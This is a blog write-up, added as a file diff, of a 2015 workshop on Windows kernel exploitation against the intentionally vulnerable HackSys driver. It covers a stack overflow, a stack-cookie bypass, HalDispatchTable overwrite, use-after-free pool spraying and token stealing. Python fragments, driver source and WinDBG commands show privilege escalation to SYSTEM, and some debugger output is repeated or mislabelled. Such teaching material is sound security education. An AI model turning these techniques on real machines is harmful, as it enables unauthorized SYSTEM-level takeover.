@@ -1,0 +1,439 @@
+I"nc<p>This write-up summarizes a workshop/humla conducted by <a href="http://swachalit.null.co.in/profile/411-ashfaq-ansari">Ashfaq Ansari</a> on the basics of various kinds of attacks available for exploiting the <strong>Windows Kernel</strong> as of this date. It describes and demonstrates some of the very common techniques to illustrate the impacts of bypassing Kernel security and how the same could be achieved by exploiting specific flaws in kernel mode components. A knowledge of basic buffer overflow exploits through user mode applications is a plus when understanding kernel exploitation and memory issues.</p>
+
+<!--more-->
+
+<p>Humla Champion: <strong><a href="http://swachalit.null.co.in/profile/411-ashfaq-ansari">Ashfaq Ansari</a></strong></p>
+
+<p>Post Author: <strong><a href="https://twitter.com/neelutripathy">Neelu Tripathy</a></strong></p>
+
+<p>Workshop: <strong><a href="http://swachalit.null.co.in/events/83-mumbai-null-mumbai-humla-18-april-2015-windows-kernel-exploitation">Null Humla</a></strong></p>
+
+<p>Date: <strong>18th April, 2015</strong></p>
+
+<p>Venue: <strong>Mumbai, BKC</strong></p>
+
+<p>Driver: <strong>HackSys Extreme Vulnerable Driver</strong></p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>A plethora of attacks have illustrated that attacker specific code execution is possible through user mode applications/software.  Hence, lot of protection mechanisms are being put into place to prevent and detect such attacks in the operating system either through randomization, execution prevention, enhanced memory protection, etc. for user mode applications.</p>
+
+<p>However little work has been done on the Kernel end to save the base OS from exploitation. In this article we will discuss the various exploit techniques and methods that abuse Kernel architecture and assumptions.</p>
+
+<h2 id="initial-set-up">Initial Set Up</h2>
+
+<p>All the demonstrations were provided on <strong>Windows 7 x86 SP1</strong> where a custom built <strong>HackSys Extreme Vulnerable Driver</strong> [intentionally vulnerable] was exploited to show Kernel level flaws and how they could be exploited to escalate privilege from Low Integrity to High Integrity.</p>
+
+<p>The below set up was used:</p>
+
+<ul>
+  <li>Windows 7 OS for Debugger and Debugee machine</li>
+  <li>Virtual Box</li>
+  <li>HackSys Extreme Vulnerable Driver</li>
+  <li>Windows Kernel Debugger – WinDBG</li>
+</ul>
+
+<p>Note: set the create pipe path in debugger as <code class="language-plaintext highlighter-rouge">\.\pipe\com1</code> and enable the same in debugee.</p>
+
+<h2 id="windows-kernel-architecture">Windows Kernel Architecture</h2>
+
+<p>Before moving to exploitation let’s take a look at the basic architecture of the Kernel and modus operandi for process based space allocation and execution for Windows. The two major components of the Windows OS are User mode and Kernel mode. Any programs executing, will belong to either of these modes.</p>
+
+<p><img src="/images/windoes_architecture.png" alt="windows architecture" title="Figure 1: Windows Architecture Source: logs.msdn.com" /></p>
+
+<p><strong>HAL: Hardware Abstraction Layer</strong> – Is a layer of software routines for supporting different hardware with same Software; <strong>HalDispatchTable</strong> holds the addresses of some HAL routines</p>
+
+<h2 id="stack-overflow">Stack Overflow</h2>
+
+<p>A stack overflow occurs when there is no proper bound checking done while copying user input to the pre-allocated buffer. A <strong>memcpy()</strong> operation was used by the vulnerable program which copies data beyond the pre-defined byte buffer for the variable.</p>
+
+<p>In the example below, we are using a program that uses the <strong>memcpy()</strong> function.</p>
+
+<p><img src="/images/Ovflow_RTlCopyMemory.png" alt="Ovflow_RTlCopyMemory" title="Figure 2: StackOverflow.c" /></p>
+
+<p>At first we write the buffer with a large enough value so as to overflow it and overwrite the <strong>RET</strong> (return) address. This shall give us control as to where we want to point for the next instruction. We proceed by using all A’s and successfully crashing the stack. However, to find the exact offset of the <strong>RET</strong> overwrite. This can be done, by sending a pattern and finding the offset of <strong>RET</strong> overwrite.</p>
+
+<p>For this purpose we use a unique pattern and provide it as the input using our exploit code. In the debugger, we find the exact offset as shown below:</p>
+
+<p><img src="/images/Pattern_at_EIP.png" alt="Pattern_at_EIP" title="Figure 3: EIP holding predictable pattern" /></p>
+
+<p>As evident from above, the <strong>EIP</strong> has its offset at <strong>72433372</strong>  (Read backwards – Little Endian). For our unique pattern of characters used as input, this pattern and hence the <strong>EIP</strong> offset is at <strong>2080</strong>.</p>
+
+<p>In our exploit code, we define the shellcode and allocate to ‘<strong>ring0_shellcode</strong>’ as below and</p>
+
+<p><img src="/images/Sheellcode_defn.png" alt="Sheellcode_defn" title="Figure 4: EoP Shellcode" /></p>
+
+<p>Add its address to our buffer as below. Here we keep the payload in user mode and execute it from kernel mode by adding the address of ring0 shellcode to the buffer.</p>
+
+<noscript><pre># shellcode real memory address
+ring0_shellcode_address = id(ring0_shellcode) + 20
+# pattern offset is 2080
+
+k_buffer = &quot;\x41&quot; * 2080
+# add the address of ring0 shellcode to the buffer
+k_buffer += struct.pack(&quot;L&quot;, ring0_shellcode_address)
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/4d2c4e85ba8b6e6aafdc.js"> </script>
+
+<p><strong>Note</strong>: In the first step, we find the address of our shellcode in memory using an interesting feature of Python i.e. <strong>ring0_shellcode_address = id(ring0_shellcode) + 20 //id(var) + 20</strong></p>
+
+<p>Following this, we place the address to our shell code at the EIP offset found from the previous step. On execution, this shellcode [for cmd.exe] is called and spawns the shell with system privilege as shown below:</p>
+
+<p><img src="/images/CalcPopped_VanillaOvflw.png" alt="CalcPopped_VanillaOvflw" title="Figure 5: Spawn calc.exe with SYSTEM privileges" /></p>
+
+<h2 id="stack-overflow-stack-guard-bypass">Stack Overflow Stack Guard Bypass</h2>
+
+<p>A protection mechanism to defeat stack overflows was proposed as a Stack Guard. With the implementation of this method, an executing function has two main components such as – the function_prologue and the function_epilogue methods.
+Stack Guard is a compiler feature which adds code to function_prologue and function_epilogue to set and validate the stack canary.</p>
+
+<h3 id="function-prologue">Function prologue</h3>
+
+<p><img src="/images/SO_GS_Function.png" alt="SO_GS_Function" title="Figure 6: _except_handler4" /></p>
+
+<p><img src="/images/SO_GS_Prologue.png" alt="SO_GS_Prologue" title="Figure 7: __security_cookie" /></p>
+
+<h3 id="function-epilogue">Function Epilogue</h3>
+
+<p><img src="/images/SO_GS_Epilogue.png" alt="SO_GS_Epilogue" title="Figure 8: Security Cookie Validation In Function Epilogue" /></p>
+
+<p>Referring to the program above, we find that every time we overwrite the stack in the conventional way, we will have to overwrite the Stack Cookie as well. So unless we write the right value in the canary, the check in the epilogue will fail and abort the program.</p>
+
+<h3 id="workaround">Workaround</h3>
+
+<p>To exploit this scenario of Stack Overflow protected by Stack Cookie, we will exploit the exception handling mechanism. As the exception handler are on the stack and as an attacker, we have the ability to overwrite things on the stack, we will overwrite the exception handler with the address of our shellcode and will raise the exception while copying the user supplied buffer to kernel allocated buffer to jump to our shellcode.</p>
+
+<p><img src="/images/SO_GS_ExploitCode_trigger.png" alt="SO_GS_ExploitCode_trigger" title="Figure 9: StackOverflow Gaurd Bypass using exploit code" /></p>
+
+<p>Executing INT 3 instruction after bypassing Stack Guard as per the exploit code below:</p>
+
+<noscript><pre># shellcode start
+ring0_shellcode = &quot;\x90&quot; * 8 + &quot;\xcc&quot;
+# shellcode end</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/b93b2e7e5c9be1b605d0.js"> </script>
+
+<p><img src="/images/SO_GS_BypassInDebugger.png" alt="SO_GS_BypassInDebugger" title="Figure 10: Bypassing the stack Guard" /></p>
+
+<p><img src="/images/SO_GS_ExploitInDebugger.png" alt="SO_GS_ExploitInDebugger" title="Figure 11: Executing the shellcode and halted at breakpoint" /></p>
+
+<h2 id="arbitrary-overwrites">Arbitrary Overwrites</h2>
+
+<p>This is also called the Write What Where class of vulnerabilities in which an attacker has the ability to write an arbitrary value at arbitrary memory location. If not done accurately, this may crash (User Mode)/may BSOD (Kernel Mode).</p>
+
+<p>Typically there may be restrictions to</p>
+
+<ul>
+  <li>Value – as to what value can be written</li>
+  <li>Size – What size of memory may be overwritten</li>
+  <li>And sometimes one may only be allowed to increment or decrement the memory</li>
+</ul>
+
+<p>These kind of bugs are difficult to find as compared to the other known types but can prove to be very useful for an attacker for seamless execution of malicious code. There are various places where the attacker value can be written for effective execution such as <strong>HalDispatchTable+4, Interrupt Dispatch Table, System Service Dispatch Table,</strong> and so on.</p>
+
+<p>Below is a sample WRITE_WHAT_WHERE structure containing the What-Where fields:</p>
+
+<p><img src="/images/What_where_NullPtr.png" alt="What_where_NullPtr" title="Figure 12: WRITE_WHAT_WHERE Structure" /></p>
+
+<p>Since the vulnerable function allows us to define the <strong>What</strong> and <strong>Where</strong> attributes in the structure, we assign the address of pointer to our own crafted shellcode to <strong>‘What’</strong> and address of <strong>HalDispatchTable0x4</strong> to <strong>‘Where’</strong> as shown below:</p>
+
+<p><img src="/images/Assign_HALTableAddr.png" alt="Figure 13: Assigning Shellcode address and HAL Dispatch table address to pointers" title="Figure 13: Assigning shellcode address and HAL Dispatch Table address to structure" /></p>
+
+<noscript><pre>out  = c_ulong()
+inp  = 0x1337
+
+hola = ntdll.NtQueryIntervalProfile(inp, byref(out))
+
+print(&quot;[+] Spawning SYSTEM Shell&quot;)
+
+program_pid = subprocess.Popen(&quot;cmd.exe&quot;, 
+                               creationflags=subprocess.CREATE_NEW_CONSOLE,
+                               close_fds=True).pid
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/e3af9f2a1cef7bf528db.js"> </script>
+
+<p>We have halted the program in the kernel debugger to examine the <strong>HalDispatch Table</strong> function address as shown below:</p>
+
+<p><img src="/images/HAL_Table_InDebugger.png" alt="Figure 14: Reading Hal Dispatch Table Address Using Debugger" /></p>
+
+<p><img src="/images/WWW_Execution.png" alt="Figure 15: Executing the exploit code for Write_What_Where bug" title="Figure 15: Executing the exploit code for Write_What_Where bug" /></p>
+
+<p>After triggering the exploit, we examine the memory in the debugger to find that the kernel has written the address of the shellcode at HalDispatchTable+4 which then gets executed. The below diagram shows program halted at the breakpoints as per the code.</p>
+
+<p><img src="/images/WWW_Debug_Ptr.png" alt="Figure 16: Debugging a successful What_Where Null Pointer issue. At the breakpoint as per the program" title="Figure 16: EIP control by exploiting Write4 condition" /></p>
+
+<p><img src="/images/WWW_Debug_EIP.png" alt="Figure 17: EIP currently at breakpoint after overwrite" title="Figure 17: EIP currently at breakpoint after overwrite" /></p>
+
+<p>Going further, the shellcode provided in the payload will be executed due to the arbitrary overwrite condition.</p>
+
+<h2 id="use-after-free-bug-exploitation">Use After Free Bug Exploitation</h2>
+
+<p>When a program uses allocated memory after it has been freed, it can lead to unexpected system behaviour such as exception or can be used to gain arbitrary code execution. The modus operandi generally entails:</p>
+
+<p><img src="/images/UAF.png" alt="Use After Free Bug Exploitation" /></p>
+
+<p>At some point an object gets created and is associated with a vtable, then later a method gets called by program. If we free the object before it gets used by the program, it may crash when program when it tries call a method.</p>
+
+<p>To exploit this scenario, an attacker grooms the memory to make predictable pool layout. Then, allocates all similar sized objects. Next, the attacker tries to free some objects to create holes. Then, allocate and frees the vulnerable object. Finally, attacker fills the holes to take up the allocation where the vulnerable object was allocated. Such vulnerabilities are difficult to find and exploit and certain considerations are necessary such as:</p>
+
+<ul>
+  <li>The pointer to the shellcode has to be placed in the same memory location as the freed vulnerable object memory location.</li>
+  <li>The hole size created by pool spray has to be of the same size as the one freed.</li>
+  <li>There should be no adjacent memory chunks free to prevent coalescing.</li>
+</ul>
+
+<p><strong>Coalescing</strong>: When two separate but adjacent chunks in memory are free, the operating system con-joins these smaller chunks to create a bigger chunk of memory to avoid fragmentation. This process is called Coalescing and this would make harder to exploit Use After free bugs since then, memory manager won’t allocate the designated memory and the chances for the attacker to get same memory location is very less.</p>
+
+<p>Sample vulnerable C functions depict Use After Free bug in a kernel driver are given below:</p>
+
+<noscript><pre>NTSTATUS HackSysHandleIoctlCreateBuffer(IN PIRP pIrp, IN PIO_STACK_LOCATION pIoStackIrp)
+{
+	PUSE_AFTER_FREE pUseAfterFree = NULL;
+	SIZE_T inputBufferSize = 0;
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+	UNREFERENCED_PARAMETER(pIrp);
+	UNREFERENCED_PARAMETER(pIoStackIrp);
+	PAGED_CODE();
+
+	status = CreateBuffer();
+	
+	return status;
+}
+
+NTSTATUS HackSysHandleIoctlUseBuffer(IN PIRP pIrp, IN PIO_STACK_LOCATION pIoStackIrp)
+{
+	PVOID pInputBuffer = NULL;
+	SIZE_T inputBufferSize = 0;
+	PUSE_AFTER_FREE pUseAfterFree = NULL;
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+	UNREFERENCED_PARAMETER(pIrp);
+	PAGED_CODE();
+
+	pInputBuffer = pIoStackIrp-&gt;Parameters.DeviceIoControl.Type3InputBuffer;
+	inputBufferSize = sizeof(pUseAfterFree-&gt;buffer);
+
+	if (pInputBuffer)
+		status = UseBuffer(pInputBuffer, inputBufferSize);
+	
+	return status;
+}
+
+NTSTATUS HackSysHandleIoctlFreeBuffer(IN PIRP pIrp, IN PIO_STACK_LOCATION pIoStackIrp)
+{
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+	UNREFERENCED_PARAMETER(pIrp);
+	UNREFERENCED_PARAMETER(pIoStackIrp);
+	PAGED_CODE();
+
+	status = FreeBuffer();
+	
+	return status;
+}
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/973afea5def4b1d59a21.js"> </script>
+
+<noscript><pre>#ifndef __USE_AFTER_FREE_H__
+    #define __USE_AFTER_FREE_H__
+    #pragma once
+    #include &quot;Common.h&quot;
+
+    typedef struct _USE_AFTER_FREE {
+        FunctionPointer pCallback;
+        CHAR buffer[0x54];
+    } USE_AFTER_FREE, *PUSE_AFTER_FREE;
+
+    typedef struct _FAKE_OBJECT {
+        CHAR buffer[0x58];
+    } FAKE_OBJECT, *PFAKE_OBJECT;
+#endif</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/99b10384ccf42ae452db.js"> </script>
+
+<p>Below example demonstrates such an exploit, where we have the debugee/target running as Guest. To trigger the Use After free bug we will have to first allocate the vulnerable object on the Kernel Pool, free it and force the vulnerable program to use the freed object.</p>
+
+<p><img src="/images/UAF_Execution.png" alt="Figure 18:Use After Free Object assigned. Waiting to free it." title="Figure 18:Use After Free Object allocated. Waiting to free it." /></p>
+
+<p>Following this, we free the objects to create holes. Finally, we fill all the freed chunks to take up the memory location where the vulnerable object was created. This takes some time as for the purpose of demonstration this was done around 100 times. We all reallocate the UaF object with a FakeObject.</p>
+
+<p><img src="/images/UAF_Steps.png" alt="Figure 19: Free and reallocate UAF object" title="Figure 19: Free and reallocate UAF object" /></p>
+
+<p><img src="/images/UAF_FillFreedChunks.png" alt="Figure 20: Free and reallocate UAF object" title="Figure 20: Free and reallocate UAF object" /></p>
+
+<p>Meanwhile, the chunks have been filled by our/attacker controlled/fake object. If we look at the pool layout at this moment, then we can see that we have successfully reallocated the holes that we had created.</p>
+
+<p><img src="/images/UAF_MemorySpray.png" alt="Figure 21: All consecutive chunks filled with IoCo ensures memory was evenly sprayed" title="Figure 21: All consecutive chunks filled with IoCo ensures memory was evenly sprayed" /></p>
+
+<p>Finally the code triggers the use of the freed UaF object and hence the bug. As per the exploit code it spawns a shell with SYSTEM privileges as shown below:</p>
+
+<p><img src="/images/UAF_PrivEscToSystem.png" alt="Figure 22: Attacker code executes with SYSTEM privilege" title="Figure 22: Attacker code executes with SYSTEM privilege" /></p>
+
+<h2 id="token-stealing-using-kernel-debugger">Token Stealing using Kernel Debugger</h2>
+
+<p>Another interesting phenomenon that can be demonstrated using the Kernel flaws is privilege escalation using process tokens.</p>
+
+<p>In the below section we illustrate how an attacker can steal tokens from a higher or different privilege level and impersonate the same to elevate or change the privilege for another process. Using such vulnerabilities in the Kernel, any existing process can be given <strong>SYSTEM</strong> level privileges in spite of some of the known Kernel protections in place to avoid misuse such as <strong>ASLR, DEP, Safe SEH, SEHOP,</strong> etc.</p>
+
+<p>Below is a step by step illustration for the ‘Guest‘ user that represents the guest having Low privilege. We will use kernel debugging session to escalate the rights of a cmd.exe process from Administrator to SYSTEM.</p>
+
+<p>Use the debugger to find the current running processes and their attributes such as below-</p>
+
+<noscript><pre>PROCESS 8570b5e8  SessionId: 1  Cid: 025c    Peb: 7ffdf000  ParentCid: 0704
+    DirBase: 3eea5340  ObjectTable: 953b8570  HandleCount:  21.
+    Image: cmd.exe
+
+PROCESS 83dbb020  SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
+    DirBase: 00185000  ObjectTable: 87801c98  HandleCount: 481.
+    Image: System
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/5de44c293c3eb54ebca9.js"> </script>
+
+<p>For <strong>cmd.exe</strong></p>
+
+<noscript><pre>kd&gt; !process 8570b5e8 1
+PROCESS 8570b5e8  SessionId: 1  Cid: 025c    Peb: 7ffdf000  ParentCid: 0704
+    DirBase: 3eea5340  ObjectTable: 953b8570  HandleCount:  21.
+    Image: cmd.exe
+    VadRoot 8553ba60 Vads 37 Clone 0 Private 135. Modified 0. Locked 0.
+    DeviceMap 92b1bc80
+    Token                             953b6030
+    ElapsedTime                       00:02:53.332
+    UserTime                          00:00:00.000
+. . .
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/dbcc64ce865b2faf43fd.js"> </script>
+
+<p>For <strong>SYSTEM</strong></p>
+
+<noscript><pre>kd&gt; !process 8570b5e8 1
+PROCESS 8570b5e8  SessionId: 1  Cid: 025c    Peb: 7ffdf000  ParentCid: 0704
+    DirBase: 3eea5340  ObjectTable: 953b8570  HandleCount:  21.
+    Image: cmd.exe
+    VadRoot 8553ba60 Vads 37 Clone 0 Private 135. Modified 0. Locked 0.
+    DeviceMap 92b1bc80
+    Token                             953b6030
+    ElapsedTime                       00:02:53.332
+    UserTime                          00:00:00.000
+. . .
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/dbcc64ce865b2faf43fd.js"> </script>
+
+<p>Now that we know the token for the system process, we can switch to the cmd.exe process and find the location for the token for this process.</p>
+
+<noscript><pre>kd&gt; !process 8570b5e8 1
+PROCESS 8570b5e8  SessionId: 1  Cid: 025c    Peb: 7ffdf000  ParentCid: 0704
+    DirBase: 3eea5340  ObjectTable: 953b8570  HandleCount:  21.
+    Image: cmd.exe
+    VadRoot 8553ba60 Vads 37 Clone 0 Private 135. Modified 0. Locked 0.
+    DeviceMap 92b1bc80
+    Token                             953b6030
+    ElapsedTime                       00:02:53.332
+    UserTime                          00:00:00.000
+. . .
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/dbcc64ce865b2faf43fd.js"> </script>
+
+<ul>
+  <li>Get the structure at <strong>KPCR</strong> from the address found above</li>
+</ul>
+
+<noscript><pre>kd&gt; dt nt!_KTHREAD 0x83dcd020
+   +0x000 Header           : _DISPATCHER_HEADER
+    . . . 
+   +0x03c SystemThread     : 0y1
+   +0x03c Reserved         : 0y000000000000000000 (0)
+   +0x03c MiscFlags        : 0n8193
+   +0x040 ApcState         : _KAPC_STATE
+   +0x040 ApcStateFill     : [23]  &quot;`???&quot;
+   +0x057 Priority         : 12 &#39;&#39;
+    . . .
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/4972d49588e3373a9627.js"> </script>
+
+<ul>
+  <li>Get address of <strong>CurrentThread</strong> member (<strong>KTHREAD</strong>) at the <strong>+0x120</strong> Offset</li>
+</ul>
+
+<noscript><pre>kd&gt; dt nt!_KPRCB 82770c00+0x120
+   +0x000 MinorVersion     : 1
+   +0x002 MajorVersion     : 1
+   +0x004 CurrentThread    : 0x83dcd020 _KTHREAD
+   +0x008 NextThread       : (null) 
+   +0x00c IdleThread       : 0x8277a380 _KTHREAD
+   +0x010 LegacyNumber     : 0 &#39;&#39;
+   +0x011 NestingLevel     : 0 &#39;&#39;
+     . . .
+   +0x3620 ExtendedState    : 0x807bf000 _XSAVE_AREA
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/f295994b0a811cf90e88.js"> </script>
+
+<ul>
+  <li>Get address of <strong>ApcState</strong> member (<strong>KAPC_STATE</strong>). It contains a pointer to <strong>KPROCESS</strong></li>
+</ul>
+
+<noscript><pre>kd&gt; dt nt!_KAPC_STATE 0x83dcd020+0x40
+   +0x000 ApcListHead      : [2] _LIST_ENTRY [ 0x83dcd060 - 0x83dcd060 ]
+   +0x010 Process          : 0x8570b5e8 _KPROCESS
+   +0x014 KernelApcInProgress : 0 &#39;&#39;
+   +0x015 KernelApcPending : 0 &#39;&#39;
+   +0x016 UserApcPending   : 0 &#39;&#39;
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/1a838ae28942444a20fc.js"> </script>
+
+<p>Get address of <strong>Process</strong> member (<strong>KPROCESS</strong>). It contains the <strong>Token</strong> value and is at an offset <strong>+0x40</strong> from the <strong>KTHREAD</strong> base address.</p>
+
+<noscript><pre>kd&gt; !process 8570b5e8 1
+PROCESS 8570b5e8  SessionId: 1  Cid: 025c    Peb: 7ffdf000  ParentCid: 0704
+    DirBase: 3eea5340  ObjectTable: 953b8570  HandleCount:  21.
+    Image: cmd.exe
+    VadRoot 8553ba60 Vads 37 Clone 0 Private 135. Modified 0. Locked 0.
+    DeviceMap 92b1bc80
+    Token                             953b6030
+    ElapsedTime                       00:02:53.332
+    UserTime                          00:00:00.000
+. . .
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/dbcc64ce865b2faf43fd.js"> </script>
+
+<p><img src="/images/TS_KAPC_ListE.png" alt="Figure 23: KAPC List Entry" title="Figure 23: KAPC List Entry" /></p>
+
+<ul>
+  <li>Get Token member offset from <strong>EPROCESS</strong> structure. <strong>KPROCESS</strong> is the first structure of <strong>EPROCESS</strong></li>
+</ul>
+
+<noscript><pre>kd&gt; dt nt!_EPROCESS 0x8570b5e8
+   +0x000 Pcb              : _KPROCESS
+   +0x098 ProcessLock      : _EX_PUSH_LOCK
+   . . .
+   +0x0f4 ObjectTable      : 0x953b8570 _HANDLE_TABLE
+   +0x0f8 Token            : _EX_FAST_REF
+   +0x0fc WorkingSetPage   : 0xb2b3
+   +0x100 AddressCreationLock : _EX_PUSH_LOCK
+    . . .
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/51e1836037f31a092512.js"> </script>
+
+<ul>
+  <li>Get <strong>Token</strong> value</li>
+</ul>
+
+<noscript><pre>kd&gt; dt nt!_EX_FAST_REF 0x8570b5e8+f8
+   +0x000 Object           : 0x953b6037 Void
+   +0x000 RefCnt           : 0y111
+   +0x000 Value            : 0x953b6037
+</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/318e34687c39c031ccf5.js"> </script>
+
+<p>Actual Token value by <strong>ANDing</strong> last 3 bits to 0 = 0x953b6037 » 0x953b6030
+Now replace the current process token with <strong>SYSTEM</strong> token.</p>
+
+<noscript><pre>kd&gt;  ed 0x8570b5e8+f8 878013e0</pre></noscript>
+<script src="https://gist.github.com/hacksysteam/d793875ab9c80c5bad99.js"> </script>
+
+<p><img src="/images/TS_Tokenreplaced.png" alt="TS_Tokenreplaced" title="Figure 24: Token value replaced" /></p>
+
+<p>Soon as we replace the token we are assigned the SYSTEM token and the privileges that come with it. The same was verified as below in the victim machine:</p>
+
+<p><img src="/images/TS_PrivEsc_Guest2Sys.png" alt="Figure 25: Escalating from Guest to System privilege using Token Stealing" title="Figure 25: Escalating from Guest to System privilege using Token Stealing" /></p>
+
+<p><img src="/images/TS_PrivEsc_Admin2Sys.png" alt="Figure 26: An example: Local privilege escalation using token stealing from Administrator" title="Figure 26: An example: Local privilege escalation using token stealing from Guest" /></p>
+:ET
